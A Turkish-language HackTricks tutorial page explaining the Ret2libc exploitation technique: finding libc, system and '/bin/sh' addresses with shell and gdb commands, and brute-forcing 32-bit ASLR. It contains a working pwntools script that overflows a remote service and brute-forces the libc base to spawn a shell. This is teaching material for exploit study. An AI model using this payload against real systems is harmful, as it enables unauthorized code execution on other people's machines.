# Ret2lib

<details>

<summary><strong>AWS hacklemeyi sıfırdan ileri seviyeye öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)'da **takip edin**.
* **Hacking püf noktalarınızı paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## **Temel Bilgiler**

**Ret2Libc**'nin özü, zayıf bir programın yürütme akışını, saldırgan tarafından sağlanan shellcode'un yığında yürütülmesi yerine, paylaşılan bir kütüphane içindeki bir işlevine yönlendirmektir (örneğin, **system**, **execve**, **strcpy**). Saldırgan, geri dönüş adresini değiştiren bir yük oluşturur ve yığında istenen kütüphane işlevine işaret ederken, aynı zamanda çağrı konvansiyonuna göre gerekli argümanların da doğru şekilde ayarlanmasını sağlar.

### **Örnek Adımlar (basitleştirilmiş)**

* Çağrılacak işlevin adresini alın (örneğin, system) ve çağrılacak komutu (örneğin, /bin/sh)
* İlk argümanı komut dizinine işaret edecek şekilde ve yürütme akışını işleve geçirecek şekilde ROP zinciri oluşturun

## Adresleri Bulma

* Kullanılan `libc`'nin mevcut makineden olduğunu varsayarsak, nerede bellekte yükleneceğini aşağıdaki komutla bulabilirsiniz:

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

Eğer ASLR'nin libc adresini değiştirip değiştirmediğini kontrol etmek istiyorsanız şunu yapabilirsiniz:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* Kullanılan libc bilindiğinde, `system` işlevine olan ofseti bulmak da mümkündür:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* Kullanılan libc bilindiğinde, `/bin/sh` dizesinin işlevine olan ofseti bulmak da mümkündür:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### gdb-peda / GEF Kullanımı

Kullanılan libc bilindiğinde, Peda veya GEF kullanılarak **system** fonksiyonunun, **exit** fonksiyonunun ve **`/bin/sh`** dizesinin adresini elde etmek de mümkündür:
```
p system
p exit
find "/bin/sh"
```
### /proc/\<PID>/maps Kullanımı

Eğer işlem her konuştuğunuzda **çocuklar** oluşturuyorsa (ağ sunucusu) o dosyayı **okumayı deneyin** (muhtemelen root olmanız gerekecektir).

Burada işlem içinde **libc'nin tam olarak nerede yüklendiğini** ve işlemin her çocuğu için **nerede yükleneceğini** bulabilirsiniz.

![](<../../../../.gitbook/assets/image (95).png>)

Bu durumda **0xb75dc000** adresine yüklendi (Bu libc'nin taban adresi olacak)

## Bilinmeyen libc

Binary'nin yüklediği libc'yi **bilmediğiniz olabilir** (çünkü erişiminiz olmayan bir sunucuda olabilir). Bu durumda zafiyeti **bazı adresleri sızdırmak ve hangi libc** kütüphanesinin kullanıldığını bulmak için kötüye kullanabilirsiniz:

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

Ve bunun için bir pwntools şablonunu şurada bulabilirsiniz:

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

## 32 bit ASLR'yi Atlatma

Bu brute-force saldırıları **yalnızca 32 bit sistemler için** kullanışlıdır.

* Eğer saldırı yerel ise, libc'nin taban adresini brute-force etmeyi deneyebilirsiniz (32 bit sistemler için kullanışlı):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Uzak bir sunucuyu hedef alıyorsanız, `libc` fonksiyonu `usleep`'in adresini **10 (örneğin) olarak argüman geçerek** **brute-force** deneyebilirsiniz. Eğer sunucu cevap vermek için **10 saniye daha fazla zaman alıyorsa**, bu fonksiyonun adresini buldunuz demektir.

## Tek Gadget

{% content-ref url="../../one-gadget.md" %}
[one-gadget.md](../../one-gadget.md)
{% endcontent-ref %}

## x86 Ret2lib Kod Örneği

Bu örnekte ASLR brute-force kod içine entegre edilmiş ve zafiyetli ikili dosya uzak bir sunucuda bulunmaktadır:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib Kod Örneği

Örneği kontrol et:

{% content-ref url="../rop-return-oriented-programing.md" %}
[rop-return-oriented-programing.md](../rop-return-oriented-programing.md)
{% endcontent-ref %}

## Ret-into-printf (veya puts)

Bu, `printf`/`puts`'ı belirli verilerle bir argüman olarak çağırarak işlemdeki bilgileri **sızdırmayı** sağlar.

## Ret2printf

Bu temelde, bir **Ret2lib'i `printf` format dizesi zafiyetine dönüştürmek** için `ret2lib`'i kullanarak, değerleri istismar etmek için printf'i çağırmak anlamına gelir (anlamsız gibi görünse de mümkündür):

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}
